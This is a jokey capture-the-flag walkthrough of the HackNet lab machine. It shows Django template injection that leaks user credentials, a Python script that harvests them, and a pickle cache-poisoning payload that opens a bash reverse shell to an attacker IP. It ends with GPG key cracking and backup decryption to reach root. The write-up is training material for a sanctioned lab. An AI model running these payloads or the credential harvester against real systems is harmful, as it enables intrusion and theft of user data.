# HackNet HTB Machine: A Wild, Wacky Walkthrough 😈

Welcome, brave digital explorer! This is HackNet HTB retold  that teaches you *why* each step works, including every single command and code snippet. Think of it as a sitcom with a side of hacking.

> Difficulty: beginner → intermediate (web app logic, template injection, cache shenanigans, GPG magic)

---

## Prologue: The Release Day Madness

I fired up HackNet the moment it was released. Absolute chaos! Even the top 10 players were scratching their heads. Someone in the community cracked a joke:

> "Ok, then the problem is not the machine, but that we have to guess and mind-read what you want in your writeup."

And honestly… yep. That’s exactly how this adventure started. Spoiler: files vanish if you peek at them too early — spooky.

---

## Act 1 — Setup: Put on your Explorer Hat

```bash
# Connect to HTB VPN
sudo openvpn starting_point_[username].ovpn

# Add the target to hosts file
echo "10.10.11.x hacknet.htb" | sudo tee -a /etc/hosts

# Create a workspace for HackNet
mkdir -p ~/hacknet_htb && cd ~/hacknet_htb

# Perform network scanning with default scripts, version detection, and OS fingerprinting
nmap -sC -sV -A hacknet.htb -oN nmap_hacknet.txt
```

*Learning point:* `nmap` shows open ports and services. HTTP + SSH are the main doors into the system.

---

## Act 2 — Meet the Hacker Playground

1. Open browser to `http://hacknet.htb`.
2. Register a test account:

   * Username: `testuser`
   * Email: `test@test.com`
   * Password: `password123`
3. Login and explore:

   * Profile editing (name, signature, avatar)
   * Creating posts
   * Liking/unliking posts
   * Messaging

*Learning point:* Understanding the functionality helps identify potential input points for template injection.

---

## Act 3 — Django Template Injection (DTL)

**Step 1: Test injection**

```text
# Edit profile username to:
{{ users }}
```

* Like any post.
* Click **View Likes**.
* Inspect the HTML or use `curl`:

```bash
curl -s -b "csrftoken=CSRFTOKEN; sessionid=SESSIONID" http://hacknet.htb/likes/1
```

You’ll see `<QuerySet [...]>` confirming template evaluation.

**Step 2: Extract full user data**

```text
# Change username to:
{{ users.values }}
```

* Repeat liking posts 1-30.
* Inspect likes to get emails and passwords.

*Learning point:* `{{ users }}` = test, `{{ users.values }}` = actual data extraction.

---

## Act 4 — Automate Credential Extraction

```python
# extract_creds.py
import re, requests, html

BASE='http://hacknet.htb'
HEADERS={'Cookie':'csrftoken=YOUR_CSRF; sessionid=YOUR_SESSION'}
found=set()

for post_id in range(1,31):
    # Like the post to trigger the likes view
    requests.get(f"{BASE}/like/{post_id}", headers=HEADERS)
    r=requests.get(f"{BASE}/likes/{post_id}", headers=HEADERS)

    # Extract image titles containing QuerySet dump
    titles=re.findall(r'<img [^>]*title="([^"]*)"', r.text)
    if not titles: continue
    last=html.unescape(titles[-1])

    # Extract emails and passwords
    emails=re.findall(r"'email': '([^']*)'", last)
    pwds=re.findall(r"'password': '([^']*)'", last)
    for e,p in zip(emails,pwds):
        found.add(f"{e.split('@')[0]}:{p}")

print('\n'.join(sorted(found)))
```

Run:

```bash
python3 extract_creds.py
```

*Learning point:* Automating repeated tasks saves time and reduces errors.

---

## Act 5 — SSH into User Wonderland

```bash
# SSH into target using harvested credentials
ssh zero_day@hacknet.htb

# Explore home directory
whoami
pwd
ls -la

# Capture user flag
cat user.txt
```

*Learning point:* Credentials harvested from web apps can often grant system-level access.

---

## Act 6 — Cache Poisoning: Pickle RCE

**Step 1: Check caching**

```bash
grep -R "@cache_page" /var/www -n
ls -la /var/tmp/django_cache/
```

**Step 2: Create malicious pickle**

```python
# cache_poison.py
import pickle, os

cache_dir='/var/tmp/django_cache'
cmd="bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"
class RCE:
    def __reduce__(self): return (os.system, (cmd,))
pickle_payload=pickle.dumps(RCE())

# Poison all cache files
for file in os.listdir(cache_dir):
    if file.endswith('.djcache'):
        path=os.path.join(cache_dir,file)
        with open(path,'wb') as f:
            f.write(pickle_payload)
        print(f"[+] Poisoned {file}")
```

Trigger `/explore` while listening with:

```bash
nc -lvnp 4444
```

*Learning point:* Untrusted pickles are dangerous; file-based caches can be exploited for RCE.

---

## Act 7 — Root via GPG and Backup Decryption

**Step 1: Explore sandy’s home for keys**

```bash
ls -la /home/sandy/
ls -la /home/sandy/.gnupg/
find /home/sandy -name "*.asc" -o -name "*private*" 2>/dev/null
```

* Copy `armored_key.asc` to your local machine using `python3 -m http.server 8000` or `scp`.

**Step 2: Crack key passphrase**

```bash
gpg2john armored_key.asc > gpg_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt
```

**Step 3: Locate encrypted backups**

```bash
find /var/www -name "*.gpg" 2>/dev/null
ls -la /var/www/HackNet/backups/
```

**Step 4: Create batch decryption script**

```bash
#!/bin/bash
KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="DISCOVERED_PASSPHRASE"
gpg --import "$KEY_PATH"
for file in "$BACKUP_DIR"/*.gpg; do
    [ -f "$file" ] || continue
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/${filename}.sql"
    echo "[*] Decrypting $file → $outpath"
    gpg --batch --yes --passphrase "$PASSPHRASE" --pinentry-mode loopback -o "$outpath" -d "$file"
done
echo "[+] Decryption complete. Files in $OUTPUT_DIR"
```

**Step 5: Run script and retrieve decrypted files**

```bash
chmod +x decrypt_backups.sh
./decrypt_backups.sh
python3 -m http.server 8000  # fetch decrypted backups to local machine
cat /tmp/backup0* | grep password  # get root password
```

**Step 6: Login as root**

```bash
su root
# Enter discovered password
cat /root/root.txt
```

*Learning point:* Private keys + backups can be a root goldmine. Handle with care!

---

## Epilogue: Lessons from HackNet Comedy

* `{{ users }}` = test template injection; `{{ users.values }}` = extract all data.
* Pickles = local fun, remote danger.
* Keys & backups must be access-restricted.
* Vanishing files? Copy before reading.

---
